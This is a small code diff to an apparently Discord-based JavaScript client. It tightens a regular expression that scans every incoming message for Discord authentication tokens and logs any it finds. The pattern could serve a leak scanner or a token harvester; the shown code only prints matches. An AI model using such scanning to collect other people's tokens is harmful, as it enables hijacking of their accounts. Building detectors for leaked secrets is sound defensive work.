@@ -23,7 +23,7 @@ User.on("ready", ()=>{
 })
 
 User.on("message", (message)=>{
-    const found = message.content.match(/mfa\.\w+|(?!B.)\w+\.\w+\.[a-z][A-Z]\w+.\w+/)
+    const found = message.content.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}/)
 
     if(found){
         console.log(`Discord token found: ${found}`)
